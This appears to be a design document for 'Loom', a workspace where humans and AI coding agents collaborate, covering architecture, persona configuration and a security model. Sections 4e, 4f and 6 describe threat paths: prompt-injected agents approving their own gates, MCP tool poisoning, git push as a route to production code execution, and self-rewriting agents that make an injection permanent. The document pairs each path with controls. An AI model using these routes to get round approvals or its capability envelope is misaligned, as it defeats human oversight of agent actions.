# Loom — Human + Agent Collaboration Workspace

Working name: **Loom** (placeholder). A browser-based, Slack-shaped workspace where humans and AI agents share channels, threads, and tasks. Agents are markdown-defined personas organized into Planners (orchestrators), Swarms (parallel workers), and Model Workers (single-task specialists). Every layer is swappable behind a port — UI framework, state library, transport, database, queue, storage, sandbox, and agent backend included.

**Status: revised after five independent audits** (data/infra currency, TypeScript app-layer currency, agent-execution currency, adversarial architecture review, security + product realism review). Version and license claims were verified live against registries in July 2026, not recalled. Findings that contradicted the original plan are marked **[CORRECTED]**.

Sources synthesized: Cursor "Agent Swarm Model Economics"; Anthropic "Building Effective Agents," "How We Built Our Multi-Agent Research System," "Effective Context Engineering for AI Agents," Claude Code best practices; open-source analogs (Buzz, Multica, TeamClaw, AgentTeams/HiClaw, OpenClaw, claude-squad, vibe-kanban, Ruflo, OpenHands, Agent Inbox, humanlayer, big-AGI, LibreChat).

---

## 1. What exists, and the gap

Closest analogs: **Buzz** (Block, Nostr-based, crypto-signed agent identity), **Multica** (kanban + "Squads" routing-leader pattern, backs onto Claude Code/Codex/Cursor already), **TeamClaw** (Slack-like @-mention chat, git-backed skill sharing), **AgentTeams/HiClaw** (Matrix-based Manager→Workers, "no black boxes"), **Ouroboros** (razzant/ouroboros — durable agent identity/memory across restarts, live specialist swarm, and self-rewriting implementation; see §4f).

None combine all four of:
1. Markdown personas as a first-class, versioned, shareable artifact.
2. Live-streamed agent reasoning/tool-call transcripts inside a channel.
3. Inline, in-channel human intervention rather than a separate approval queue.
4. Planner→worker→swarm hierarchies rendered as a navigable tree.

That fusion is the product.

---

## 2. Core design principles

1. **Planner/worker split is the main cost and quality lever.** Expensive model resolves ambiguity into an explicit spec; cheap model executes it. Cursor's data: Opus-planner + cheap-worker beat GPT-5.5-planner+worker on both cost (~8x) and pass rate. **Caveat the plan previously over-extended:** that result is about planner-vs-worker *model choice*, not about N-way parallelism on one repo. See §11 riskiest assumption.
2. **Default to the simplest pattern.** Single agent reply is the default; escalate to planner→workers only when the task is genuinely decomposable.
3. **Context is a finite attention budget.** Isolated context per run; parents receive condensed summaries, not raw transcripts. Checkpoint long runs to external memory.
4. **Every delegated task needs explicit scope**: objective, output format, tool constraints, boundaries.
5. **Human intervention is inline**, in the thread the agent is working in.
6. **Every agent action needs a verifiable check** — test, build, diff, or second-agent review. "Looks done" is not a stop condition.
7. **Decorrelated review beats self-review.**
8. **Conflict resolution is first-class** — but mechanical, not agentic (§7 Phase 2).
9. **Full tracing of decisions and tool calls**, append-only, from day one.
10. **Scale swarm size to task value.** Multi-agent costs 4–15x a single call.
11. **Untrusted-by-default execution.** Model output is attacker-controllable input. Every boundary — sandbox, credentials, approvals, UI rendering — assumes the agent may be adversarial (§6).

---

## 3. Product shape

**Workspace** → **Channels** → **Threads**. A **Team** = a channel + a persona roster + optional lead Planner. Humans join like Slack; agents join as roster members.

Three agent kinds, one persona format, differing by role metadata:
- **Planner** — decomposes a goal, spawns Workers, aggregates. **Gets `tools: []`** — structured decomposition output only, no filesystem or shell (§6, trust boundary).
- **Swarm** — parallel Workers spawned per decomposed goal, each isolated.
- **Model Worker** — single persona invoked directly via `@mention`, no orchestration.

### The retention hook is the inbox, not the stream **[CORRECTED]**

The security/product review's sharpest finding: **live agent-reasoning streams have near-zero long-run retention.** People collapse them within a day and check the PR instead. The real job-to-be-done is *arbitrating N concurrent agents*: unblock a stuck one, approve a gate without a context switch, and answer "why did it do that?" after a PR is wrong.

So the center of gravity is **"3 runs need you, 1 stuck 20min, 2 PRs ready"** — not the transcript, and not the graph canvas. Chat is still the right substrate (threaded, mentionable, notifiable), but **notifications and stuck-detection ship before the tree view.** Flow-pulse animation is a screenshot feature; it is explicitly deprioritized.

### Views

- **Thread view** (chat) — one agent's content: messages, tool calls, reasoning. Phase 1 core.
- **Inbox view** — cross-cutting: what needs a human now, what's stuck, what's ready to merge. Phase 1 core, ahead of the tree.
- **Tree view** (graph canvas) — swarm structure and flow, from `agent_run.parent_run_id`. Nodes are runs, edges are delegation/report. Click a node to open its thread. Phase 2, via a `subscribeToRunTree` subscription streaming structure + status only (not message content).
- **Visual creation** — Phase 1 ships a persona form (name, description, model, tools, prompt) writing the same markdown, with a raw-markdown toggle. Phase 2 adds canvas-based team composition: drag personas, draw planner→worker edges to define roster and hierarchy at design time, through the same contract calls a markdown edit uses.

Humans can at any point: read a thread live; post to redirect a running agent (§4d — this is a real constraint, not free); approve/deny a risky action inline; assign tasks from a per-channel kanban board; fork and edit a persona.

### 3a. Built-in personas, persona groups, and `@mention` **[BUILT — see HANDOFF.md]**

Persona CRUD (Phase 1) requires hand-authoring every persona's markdown from nothing, and starting a run is a static sidebar picker, not something triggered by addressing an agent in a channel — a real gap against this section's own ship criterion. Planned fix, three parts:

- **Built-in personas.** Seven roles ship pre-seeded per workspace on first provisioning: Product Manager, SWE, Frontend Engineer, Backend Engineer, QA, Security Reviewer, Solution Architect — real, editable `agent_persona` rows (not read-only templates), each with a role-appropriate tool set (e.g. Security Reviewer stays read-only: `[Read, Grep, Glob]`; engineering roles get `[Read, Edit, Write, Bash, Grep, Glob]`). Seeded exactly once per workspace, keyed off `ensureWorkspace`'s already-computed-but-currently-discarded `created` flag.
- **Persona groups ("Teams"), scoped down from this section's original Team definition (line 43).** The Team sketched above — channel + roster + optional lead Planner — is real Phase 2 scope (Planner/Swarm, §7). What's planned now is a much smaller building block: a named, workspace-level group of personas, assembled by clicking or dragging persona chips into a group in a new visual composer (an early, cut-down version of the Phase 2 "canvas-based team composition" already called out under Views above). **Organizational only** — grouping personas doesn't start anything, and does not bind to a channel or a Planner. It's a stepping stone toward the fuller Team concept, not that concept itself.
- **`@mention` starts a run.** Typing `@persona-name` in a channel's composer, autocompleted against every persona in the workspace, both posts the message as ordinary chat *and* starts a real agent run — the mentioned text becomes the run's actual task (a new optional `task` field flows from `agentRun.start` through to the Runner's prompt; today the Runner always prompts a fixed "begin working now" regardless of what a human asked). You mention **individual personas only** — mentioning a persona group would mean starting N concurrent runs, which the platform doesn't support yet (exactly one active run is tracked at a time, workspace-wide) and is Phase 2 swarm territory, not this.

Explicit non-scope, so it isn't mistaken for silently-covered ground later: no per-channel persona/team roster (a persona is mentionable in every channel, not "added" to specific ones); no repository pre-binding per channel (`@mention` prompts which bound repo to target, inline, every time); the single-active-run limit is preserved, not lifted, by this work — a second mention while a run is active must surface a clear error, never silently replace what's being watched.

---

## 4. Architecture

Hexagonal / ports-and-adapters. One dependency rule everywhere: **outer layers depend on inner, never the reverse.**

```
┌─────────────────────────────────────────────────────────────┐
│ INTERFACE      HTTP/WS controllers · UI views                │
│                only call application use-cases               │
├─────────────────────────────────────────────────────────────┤
│ APPLICATION    use-cases + PORTS (interfaces only, no impl)  │
│                StartAgentRun · DecomposeAndSpawnSwarm ·      │
│                HandleApproval · AssignTask · RedirectRun     │
├─────────────────────────────────────────────────────────────┤
│ DOMAIN         pure entities, zero dependencies              │
│                Message · Channel · Thread · AgentPersona ·   │
│                AgentRun · Task · ApprovalRequest · Actor     │
└─────────────────────────────────────────────────────────────┘
                              ▲ implements
        ┌─────────────────────┴──────────────────────┐
        │           INFRASTRUCTURE ADAPTERS           │
        │  execution · persistence · queue · events   │
        │  storage · sandbox · secrets · auth          │
        └─────────────────────────────────────────────┘
```

### 4a. The replaceability contract — every layer swappable

**Rule that makes this real: no vendor type ever crosses a port boundary.** No Drizzle row, no BullMQ `Job`, no Valkey client, no oRPC context, no Vue `ref`, no Podman container handle appears in domain or application code. If it does, that layer is no longer swappable and the violation is a bug.

Enforced mechanically, not by discipline: an ESLint `no-restricted-imports` boundary rule per package, plus one architecture test asserting `domain/` and `application/` have zero infrastructure imports. Cheap to add in Phase 0, and it's the only thing that keeps this property alive under deadline pressure.

| Port | Current adapter | Swappable to | Swap cost |
|---|---|---|---|
| `AgentExecutionPort` | Claude Agent SDK | Codex SDK, Cursor SDK, vLLM, Ollama, Bedrock, Gemini | one class + registry line |
| `PersistencePort` | Drizzle + Postgres | any SQL ORM/db | repository impls only |
| `EventBusPort` | Valkey pub/sub | NATS, Postgres `LISTEN/NOTIFY`, Kafka | one adapter |
| `QueuePort` | BullMQ | pg-boss, Graphile Worker, Temporal | one adapter |
| `BlobStoragePort` | local FS (Phase 1) → SeaweedFS | any S3-compatible, Garage, Ceph | one adapter |
| `SandboxPort` | Podman → Kata/microsandbox | E2B (self-hosted), gVisor, Firecracker | one adapter |
| `SecretsPort` | egress-proxy broker + host-side SOPS/age | OpenBao, cloud KMS | one adapter |
| `AuthPort` | Better Auth | Zitadel, Keycloak, Ory (OIDC) | one adapter |
| `NotificationPort` | web push | email, Slack mirror, desktop, webhook | one adapter |
| **UI framework** | **Vue 3 + Vite** | React, Svelte, TanStack Start, TUI | thin view layer only — see §4c |

### 4b. Driven side: agent execution

```typescript
interface AgentExecutionPort {
  execute(spec: ExecutionSpec): AsyncIterable<AgentEvent>
}
```

**The dispatch key is not "CLI vs API" — it's whether the persona declares filesystem/shell tools.** A library-shaped backend (Claude Agent SDK) and a subprocess-shaped one (Codex) both need a sandbox the moment their persona grants `Read`/`Edit`/`Bash`. A tool-less persona (classifier, summarizer) needs neither, on any provider.

- **Sandboxed** (runs in `apps/runner`, on the machine holding the repo): any persona declaring filesystem/shell tools, regardless of backend.
- **Stateless** (runs server-side, no Runner, no sandbox): tool-less personas only.

All backends integrate as **SDK library calls, not subprocess shell-outs** — every vendor now ships an embeddable SDK, so stdout/JSONL parsing is obsolete **[CORRECTED]**:

| Adapter | Package | License | Note |
|---|---|---|---|
| `ClaudeAgentAdapter` | `@anthropic-ai/claude-agent-sdk` 0.3.x | **Anthropic Commercial Terms — not OSS** | Build first. Branding: must not be called "Claude Code"; may not expose claude.ai login/subscription limits to users (API keys only) |
| `CodexAdapter` | `@openai/codex-sdk` 0.145.x | Apache-2.0 | thread continuation built in |
| `CursorAdapter` | `@cursor/sdk` 1.0.x | proprietary, public beta | **[CORRECTED — reinstated]** genuinely drivable since April 2026; local / cloud-VM / self-hosted-worker modes |
| `VllmApiAdapter` | vLLM 0.26.x | Apache-2.0 | the real self-hosted concurrent option |
| `OllamaApiAdapter` | Ollama 0.32.x | MIT | dev only — **serializes requests, degrades past ~5-6 concurrent** |

**Don't adopt an orchestration framework.** LangGraph, OpenAI Agents SDK, Microsoft Agent Framework, CrewAI, Google ADK, VoltAgent all assume they own the agent loop. Here the unit of work is an entire coding-agent process that already has its own loop, tools, permissions, and session state — wrapping those buys checkpointing and pays abstraction tax for everything else. Real needs are process supervision, durable run state, and work queues: Postgres/BullMQ territory. (Mastra is the only near-fit; still not the foundation.)

### 4c. Driving side: client-agnostic contract, framework-agnostic UI

Two layers of swappability on the driving side, because "replaceable UI" means more than "we could rewrite the components."

**1. The contract — `packages/api-contract`, built on oRPC** **[CORRECTED: was tRPC]**. tRPC is TypeScript-only *by design* and React-first in its client hooks, which collides with both the non-TS-client requirement and the Vue decision. oRPC (MIT, actively developed) gives the same DX plus **first-class OpenAPI generation**, so the same procedures serve TS clients and emit a spec for Python/Go clients later. (`ts-rest` was evaluated and rejected — no release since March 2025.)

Every use-case is a procedure. **Hard rule: if it isn't in the contract, no client can do it — including the browser.** That forces the contract to be complete rather than the browser to be complete with a side channel. Persona CRUD, roster, budgets, approval rules, RBAC all go through it. Git-backed persona files are a **projection** the server writes on `updatePersona`, never the primary write path.

**2. Framework-agnostic client core — `packages/client-core`.** All client-side logic that isn't rendering lives here as plain TypeScript: contract calls, optimistic update rules, event-stream reduction, run-tree assembly, cost aggregation, retry/reconnect/backfill. It imports the contract and nothing framework-shaped.

The framework layer is then deliberately thin — components plus a state binding. Swapping Vue→React, or adding a TUI, means rewriting that thin layer while `client-core` is reused verbatim. **Pinia (or any store) is itself a swappable detail:** stores hold only view state and subscribe to `client-core`; no business logic lives in them.

```
packages/api-contract   → oRPC procedures + Zod schemas + OpenAPI output
packages/client-core    → framework-agnostic client logic (plain TS)
apps/web                → Vue 3 + Vite  (thin views + Pinia)
apps/tui                → terminal client (thin views)
apps/server             → implements contract; owns application + domain
apps/ws-gateway         → separate WS service (see below)
apps/runner             → sandboxed local execution
```

**UI stack** **[CORRECTED: was Next.js + React]**: **Vite + Vue 3 SPA**. This app is auth-gated, SPA-shaped, and WebSocket-driven — there is no SEO surface and no meaningful use for SSR or server components. Independently confirmed by the audit: **Next.js App Router Route Handlers structurally cannot host a WebSocket** — the HTTP upgrade must happen outside the Next runtime. Since a separate WS process is required regardless of framework, Next's main advantage (colocated server code) evaporates. Vue-side choices: **Vue Flow** for the graph canvas (MIT; note it's a separate community project from xyflow's React Flow — good parity, not identical, and the one ecosystem downgrade in the switch), **shadcn-vue** or PrimeVue for components, **TanStack Virtual** (framework-agnostic) for the message list, **Pinia** for view state.

**WebSockets are split across two services by database access, not just by client type** **[CORRECTED during Phase 1 build]**. The original plan put both endpoints on one stateless `apps/ws-gateway` service. That doesn't hold: `/ws/runner` traffic (job dispatch, agent event ingest, permission requests) must persist `agent_run` rows and `approval_request` rows durably — it needs the application layer and a database connection, which `apps/ws-gateway` deliberately does not have (it exists purely to fan out Valkey pub/sub to browsers, stateless by design). So:
- `/ws/client` stays on `apps/ws-gateway` — stateless fan-out, unchanged.
- `/ws/runner` lives on **`apps/server`** instead — it needs `Deps` (repositories, use-cases) exactly like the oRPC router does, so it belongs where those already are. `apps/ws-gateway`'s `/ws/runner` stub is removed rather than left as dead code.

This preserves the actual intent (Runner traffic is the driven side, not a contract client, distinct trust model from browser traffic) while fixing the "no DB in the stateless service" contradiction the original placement created.

### 4d. The nested-orchestration boundary **[NEW — from architecture review]**

The Claude Agent SDK spawns and manages **its own subagents** (background by default), ships a **`Workflow` tool** for script-driven fan-out across many agents, and **`SendMessage`** for agent-to-agent messaging in a session. That is a second orchestration layer underneath ours, and ignoring it produces invisible work: agents the platform never renders, costs it never meters, and approvals it never gates.

Two consequences, both load-bearing:

**Use the SDK's primitives instead of hand-rolling.** Phase 2's fan-out dispatcher and any internal agent-messaging protocol are substantially already built. `AgentExecutionPort` sits *above* these, not instead of them.

**Decide the nesting policy explicitly, per persona.** Either (a) forbid SDK-internal subagent spawning (`CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH=0`) so the platform owns all orchestration and every agent is visible, or (b) allow it and ingest SDK subagent lifecycle events as real `agent_run` rows so they appear in the tree and the cost meter. **Phase 1 takes (a)** — one orchestrator, fully visible. (b) is a Phase 3 decision once event ingest is proven.

**Approval interception is a hook, not a wrapper.** The platform cannot gate a tool call by inspecting a finished run — the SDK runs its own tool loop internally. Gating requires the SDK's **`canUseTool` callback / `PreToolUse` hook**, which the Runner must implement and round-trip to the human across two WS hops while the run stays suspended. This is the single most under-appreciated piece of Phase 1 engineering.

**Live redirect is not free** **[CORRECTED]**. "Inject the human's message as the next turn" is only possible where the backend exposes mid-run input. Where it doesn't, honest options are: queue the message for the next turn boundary, or checkpoint-kill-resume with augmented context. The plan must not promise seamless interruption on backends that can't do it — per-backend capability flags (`supportsMidRunInput`, `supportsToolGate`, `supportsResume`) belong in the adapter registry, and the UI must reflect them.

### 4d-bis. Event persistence tiering

Agent runs emit thousands of events. Writing all of them to Postgres does not survive ten concurrent swarm runs, so the write path is explicitly three-tiered:

| Tier | What | Where | Retention |
|---|---|---|---|
| **Stream-only** | token deltas, partial reasoning text, keystroke-grain progress | Valkey pub/sub → WS fanout, **never persisted** | in-flight only |
| **Structured events** | tool calls (name + args hash), tool results (truncated), messages, status transitions, approvals, cost ticks | Postgres, append-only, indexed by run | full, queryable |
| **Raw transcript** | complete provider event stream, verbatim | blob storage, batched writes (chunked JSONL, flushed on size/interval) | policy-bound, redacted at write (§6 A6) |

A late-joining client backfills from tier 2 (structured) and fetches tier 3 on explicit "expand raw" — never by replaying tier 1. This is also what keeps `subscribeToRunTree` (§3) light: it carries structure and status only, never content.

### 4d-ter. Agentic context management — roadmap, not Phase 1 **[NEW]**

§4d-bis covers how the *platform* persists what an agent emitted. This covers the
separate problem of what goes *into* an agent's context window on each turn, which
Phase 1 does not manage at all: a run gets the SDK's default auto-compaction and
nothing else, and nothing carries across runs except what a human re-types.

Framing borrowed from a July 2026 position paper on "agentic context management"
(arXiv 2607.21503). Treat its provenance carefully: single-author, from a startup
whose closed-source hosted product is the reference implementation, with
self-reported benchmark numbers whose per-run artifacts and core mechanisms are
withheld. A third-party harness reports simpler BM25+vector setups scoring *higher*
on the same benchmark, so "92% = state of the art" is not a safe read. The
conceptual decomposition is the transferable part; the numbers are not evidence.

Three ideas worth adopting, in descending order of how well they survive contact
with this project:

1. **Compaction with validation.** Compress, then verify that specific facts are
   still recoverable from the compressed form, and retry less aggressively when
   they are not. The failure this prevents is real and measured: one-shot
   summarization of 18k tokens to ~122 dropped downstream accuracy *below* running
   with no context at all. Cost stays linear — a validation cost `c` every `p`
   turns is `N·W·(1+c/p)`, a fixed multiplier, not a return to quadratic. This is
   the most useful item and the only one that is implementable behind an existing
   port rather than needing new infrastructure.
2. **Extract-then-store, not store-then-extract.** Their audit of a popular memory
   library found 10,134 entries accumulated over 32 days of which 38 were usable —
   boot-file restatements, cron noise, config dumps. Storing raw turns and hoping
   retrieval sorts it out produces junk that then crowds out signal. Relevant here
   the moment §7 Phase 2's planner→worker summaries exist, since a condensed
   worker report *is* an extraction step, and doing it badly is how a planner ends
   up acting on noise.
3. **Hybrid retrieval by regime.** Their 5-corpus study has vector winning
   decisively on natural-language→code (MRR@10 0.91 vs 0.29 keyword) and losing
   decisively on science QA (0.61 vs 0.82 — "mitochondria" is a key, not a nearby
   concept), with a 60–100x indexing-time penalty for embeddings. A workspace
   indexing both code and prose will have one method wrong for half its corpus.
   Only matters once there is a corpus to retrieve *from*, which is Phase 3+.

**Explicitly not adopting** the paper's headline differentiator: a
user→customer→client scope hierarchy with multi-tenant isolation. That targets B2B
platforms where one deployment serves many organizations. Loom already carries
`workspace_id` on every row (§5), and the extra levels would be dead weight.

Also not adopting the product: it is a hosted closed service with no self-hostable
component, which fails §8's constraint outright and would mean a repo's
conversational context leaving the operator's infrastructure.

**Phasing**: item 1 lands in Phase 3 alongside the verification harness (they share
the same shape — assert a property holds after an automated transformation). Item 2
lands with Phase 2's planner aggregation, as part of the schema-validated
worker→planner report rather than as separate machinery. Item 3 is Phase 3+ and
gated on there being a retrieval corpus at all. None of it is Phase 1.

**The gap none of this closes**, worth naming because it is the one a human
actually feels: cross-session recall of *why* a decision was made. The paper punts
that to future work as largely unsolved, and this plan should not pretend
otherwise. The audit log (§5) records what happened, not the reasoning behind it.

### 4e. Capability attachment — MCP servers, tools, skills, plugins, harness settings

A persona is not just a prompt plus a model. It's a prompt, a **tool surface**, a **capability set**, and a **harness configuration** — all attachable and editable from the UI, all versioned with the persona, all swappable.

**Four attachment kinds**, each a workspace-level registry entry that personas reference (many-to-many, so one registered server serves many personas):

| Kind | Examples | Where it runs |
|---|---|---|
| **MCP server** | GitLab MCP, GitHub MCP, Postgres MCP, Sentry, an internal service | stdio → subprocess **inside the run's sandbox**; HTTP/SSE → remote, reached **through the egress proxy** |
| **CLI tool / wrapper** | `rtk`, `gh`, `jq`, project-specific scripts | baked into the sandbox base image, or an allowlisted binary path |
| **Skill** | `.claude/skills/*/SKILL.md` — procedural knowledge the agent loads on demand | mounted read-only into the sandbox |
| **Plugin / hook** | SDK hooks (`PreToolUse`, `PostToolUse`, `Stop`), custom event handlers | Runner-side, host process — **never** agent-writable |

**Harness settings, per persona** — exposed as first-class fields, not buried config: model, reasoning/effort level, permission mode, max turns, context-compaction policy, temperature, timeout, budget cap, and **subagent spawn depth** (the §4d nesting policy, per persona rather than global).

Persona frontmatter carries all of it, so the whole configuration is one reviewable, git-versioned artifact:

```yaml
---
name: backend-worker
description: Implements scoped backend changes from an explicit spec.
execution:
  provider: claude-agent      # or codex | cursor | vllm | ollama
  model: claude-sonnet-5
tools: [Read, Edit, Bash, Grep]
mcp:
  - ref: gitlab              # workspace registry entry
    scopes: [read_repository, create_merge_request]
  - ref: postgres-readonly
skills: [rtk-usage, repo-conventions]
harness:
  effort: medium
  maxTurns: 40
  permissionMode: default
  subagentDepth: 0           # §4d — platform owns orchestration
  budgetCapUsd: 5.00
---
```

**Registry, edited through the UI** (per §4c: contract-first, so the TUI gets parity): admin registers an MCP server once — transport, command/URL, args, required credentials — and personas then reference it by name. Credentials are **never** stored in persona frontmatter or passed as raw env vars into the sandbox; they resolve through the credential broker (§6 A6), so a persona references `gitlab` and the proxy attaches the real token.

**Security consequences, which are not optional here:**
- **MCP servers are executable code.** A stdio server is a subprocess with whatever access its process has. Only workspace admins may register servers; personas may only reference registered ones. An agent must never be able to add an MCP server to itself — that's privilege escalation with extra steps.
- **MCP tool descriptions are an injection surface** ("tool poisoning"): the model reads them as instructions. Registry entries are reviewed on registration, and a server's tool list is pinned/hashed so a silently-changed description triggers re-review rather than silently taking effect.
- **Capability attenuation applies** (§5): a child run can never reference an MCP server, tool, or skill its parent lacks, nor raise its own harness limits.
- Remote MCP servers count as network egress and go through the proxy's allowlist like everything else.

MCP client targets spec revision `2025-11-25` today, behind an interface — the `2026-07-28` stateless revision removes session affinity and will make horizontal scaling much easier, so plan to adopt it (§7 Phase 4). **A2A** (Linux Foundation, v1.2) is the agent-to-agent standard, but adopt it only at the *external* boundary — exposing this orchestrator as an Agent Card to other people's agents — never for internal fan-out.

**Phasing**: Phase 1 ships tool declaration + skills + harness settings (needed for a persona to be useful at all). MCP server registry and attachment land early in Phase 2 — the registry is small, but the credential-broker integration and the review/pinning flow are what take the time.

### 4f. Ouroboros mode — durable identity and self-modification **[NEW]**

Adopted scope, prompted by **Ouroboros** (razzant/ouroboros): an agent whose
identity, durable memory, and history continue across tasks and restarts, which
works on external projects, coordinates a live swarm of specialists, and **can
rewrite the implementation it runs on — code, architecture, prompts, tools, and
dependencies** — with reflection able to change how it understands itself without
severing that continuity. Assessed from that description, not an audit of its source.

This is a deliberate, informed extension of the trust model, not an oversight. Two
existing rules are **amended, not deleted**, and the amendment is what makes the
feature buildable instead of merely exciting:

- §5's capability attenuation becomes *attenuation within an envelope* (below).
- §4e's "an agent must never be able to add an MCP server to itself" becomes "never
  **outside its envelope**".

Everything else in §6 stands unchanged. The failure mode being designed against is
unchanged too, and is worth restating because self-modification sharpens it: model
output is attacker-controllable input (§2 principle 11), so a self-rewriting agent is
a mechanism by which one prompt injection can become *permanent*. §5a already names
this in miniature — persona import must never read from a run's working tree, "or
injection becomes persistent." Ouroboros mode makes that risk structural, so the
controls below are load-bearing, not ceremony.

#### The envelope — the one primitive that makes this tractable

A human grants a persona an **envelope**: a maximum tool set, model tier, budget cap,
path scope, MCP references, and subagent depth. Inside its envelope an agent may
rewrite itself freely and without asking. It can never widen its own envelope — only
a human can, through the normal contract (§4c), audited like any other admin action.

This keeps the property §5 actually cares about (there is a ceiling, and the ceiling
is human-set) while giving up the property that was incidental (that the ceiling is
also the *current* configuration). Attenuation still holds for children: a child's
envelope is a subset of its parent's, so a self-modifying planner cannot mint a worker
more capable than itself.

`agent_persona` therefore gains an `envelope` alongside its current fields, and every
self-modification is validated against it before it is applied. A modification that
would exceed the envelope is rejected and surfaced to a human as a request, not
silently clamped — clamping teaches an agent to probe.

#### Five tiers, in ascending order of blast radius

1. **Prompts / persona.** The agent rewrites its own markdown. Cheapest and most
   useful tier, and already nearly free here: the persona *is* a git-versioned
   artifact (§4e), so a self-edit is a commit — reviewable, attributable to the
   authoring `agent_run` via the audit log (§5), and revertible.
2. **Tools and capabilities.** The agent adds or drops tools and MCP references
   within its envelope. Registry entries stay admin-registered and tool-list-hashed
   (§4e) — the agent chooses *among* reviewed capabilities, it does not register new
   executable code for itself.
3. **Architecture and code.** The agent modifies Loom's own source. Mechanically this
   is just a run against Loom's repo, which §12 already calls for as dogfooding. What
   makes it Ouroboros rather than ordinary work is tier 5's continuity.
4. **Dependencies.** Highest-risk tier, treated as such. Registry egress is already
   allowlisted at the proxy (§6 A6), and lockfile/manifest changes get the same
   treatment `push-policy.ts` already gives CI config today: a distinct classifier
   requiring an explicit, separately-acknowledged human decision. Supply chain is the
   one place where "the agent decided" is not an acceptable provenance.
5. **Reflection with continuity.** Durable per-persona memory and identity that
   survive both restarts and the agent's own rewrites. This is the half that is a
   plain gap in the current plan: `agent_run` is deliberately ephemeral (§2 principle
   3) and nothing carries across runs except what a human re-types. §4d-ter's
   extract-then-store discipline is what keeps that memory from degenerating into the
   99.6% junk that store-first produces, and memory stays per-`workspace_id` and
   attenuated like every other capability — otherwise it is a side channel around the
   planner/worker boundary (§6 A7).

#### Promotion — never in place

The tail cannot be eaten by the mouth. An agent that rewrites the process it is
currently running inside can destroy the very thing that would have rolled the change
back, so tiers 3 and 4 are **build-and-promote, never edit-and-restart**:

- The agent writes to a branch in its own clone, as any run does (§5a).
- The verification harness (§7 Phase 3) runs: build, tests, and a startup smoke check
  of the *candidate*, not the incumbent.
- Promotion is a separate, explicitly gated step that swaps a new deployment in
  behind a health check, with the previous revision retained.
- Rollback is always `git revert` plus re-promote, and never depends on the modified
  code being able to do it.

A self-modification that fails its own verification is a failed run with a diff to
read — the same end state as any other failed run, which is the point.

#### What stays true regardless

- The agent still never holds git credentials and never pushes (§6 A2). Self-authored
  commits reach a remote through the host-side Runner's policy check like anything
  else.
- Approvals stay identity-bound to a human (§6 A1). A self-modifying agent gains no
  ability to approve its own gates, and `approveAction` still rejects any non-`user`
  principal.
- Secrets still never enter the sandbox (§6 A6).
- Every self-modification is an `audit_event` naming the authoring run, append-only.

#### Swarm coordination

Not adopted as a component: coordinating a live swarm of specialists is the same
problem §7 Phase 2 solves here, so Ouroboros is an alternative implementation of
Loom's core rather than something Loom can take a dependency on. Worth reading for
its scheduler design; the Planner/Swarm work stays as planned.

---

## 5. Data model

- `workspace`, `user`, `channel`, `thread`, `message`
- `actor` — **every message and every action carries an authenticated actor (`user | agent_run | system`), set server-side, never from client payload.** This is the anti-forgery primitive (§6 A1).
- `agent_persona` — markdown + frontmatter, git path, role, `execution {provider, model}`, declared `tools`, `harness {...}` (§4e)
- `capability` — workspace registry entry: kind (`mcp | cli_tool | skill | plugin`), transport/command/URL, args, required credential refs, **pinned tool-list hash** for MCP (§4e)
- `persona_capability` — join table with per-attachment scopes
- `agent_run` — persona instance: backend, model, thread, `parent_run_id`, status, token/cost totals, transcript pointer, **`budget_cap`**, **`heartbeat_at`**
- `task` — kanban item: title, assignee (persona or user), status, thread
- `approval_request` — run, action, **exact argv/diff payload**, **call hash**, risk category, status, `resolved_by` (must be a `user` actor)
- `team` — channel, persona roster, lead planner
- `repository`, `allowed_root` — §5a
- `audit_event` — append-only, immutable, from Phase 0

Every row carries `workspace_id`; every query filters on it. **Deferring full RBAC to Phase 4 is fine; deferring the actor/tenant model is not** — both are ruinous to retrofit.

`parent_run_id` renders the swarm tree, and additionally **attenuates capability**: a child run can never request tools, model tier, budget, or path scope exceeding its parent's. Reviewer and reconciler runs attach via a distinct `relation` field rather than pretending to be delegation children.

---

## 5a. Repository binding

Agents need a real codebase. It lives on the **Runner's** machine, never the server — so every path operation is a Runner capability exposed through the contract.

1. Admin defines **allowed roots** — absolute path prefixes per Runner. Hard boundary: the Runner refuses any path that doesn't resolve (after symlink resolution) inside one. Without it, an agent can be aimed at `~/.ssh`.
2. `listDirectory(runnerId, path)` → scoped entries. Backs the web directory-picker and the TUI equivalent alike.
3. Admin **binds an existing repo** or **creates one** (`git init`).

**Isolation is clone-per-run, not worktree-per-run** **[CORRECTED — the original plan was wrong]**. Git worktrees share the parent's `.git` directory, so one run can write `.git/config` (`core.hooksPath`), `.git/hooks/*`, and refs affecting *every sibling worktree and the host repo* — code execution in any later host process that runs git there. Required instead: a per-run clone (or `--separate-git-dir` inside the container), `core.hooksPath=/dev/null`, `core.fsmonitor=false`, and a hard deny on any run-produced `.git` config or hook change. Relatedly: **persona import must never read from a run's working tree**, or injection becomes persistent.

Per-run cost note: a fresh clone plus `npm install`/build is minutes and gigabytes each — a real throughput ceiling for swarms. A base-image and dependency-cache story is required before parallel workers are useful (Phase 2).

**Getting work out**: run's branch diff renders in-thread for review → merge / open PR / keep branch / discard. **The agent never pushes and never holds git credentials** (§6 A2). Sibling branches converge through the merge queue, not a race.

`repository.runner_id` pins a repo to its machine; runs route there. Multiple machines means multiple `repository` rows — no filesystem syncing.

---

## 6. Human-in-the-loop and the security model

This section is the largest revision. The security review found the original design's HITL story **decorative** — three CRITICAL flaws where a compromised agent could bypass it entirely. Prompt injection is the threat model, not an edge case: any agent reading a file, diff, or web page is reading attacker-controllable instructions.

**A1 — Approvals must be identity-bound.** Agents are roster members who post messages, and redirect injects messages as turns; nothing originally bound approval resolution to a *human*. An injected agent could approve its own gate. Fix: authenticated server-side `actor` on every message; `approveAction` rejects any principal not of type `user`; agent-authored messages inject with a distinct non-user role, never as the operator turn; approval cards render actor identity.

**A2 — `git push` is the real escape hatch, and the sandbox is irrelevant to it.** A push to a repo whose CI holds deploy credentials converts contained injection into production RCE. Fix: the agent never holds git credentials and never pushes. It commits in its sandbox; the **host-side Runner** pushes after policy check (branch matches `loom/run-<id>/*`, no force-push, no tags, no protected branches, no `.github/workflows` or CI-config change without human review). Push and deploy are platform actions, not agent tools. **Never deploy from an agent run** — emit a PR or artifact. **Built** (see HANDOFF.md): `agentRun.push` — force-push/tags/protected-branch are enforced by construction (the push always targets exactly the run's own trusted branch), CI-config changes are enforced by an explicit domain classifier requiring a second acknowledged request. PR/MR opening is best-effort via `gh`/`glab` on the Runner host (no credential broker exists yet, so this reuses whatever auth already lives there); an unparseable or unrecognized remote degrades to a compare-URL/manual message rather than failing the push.

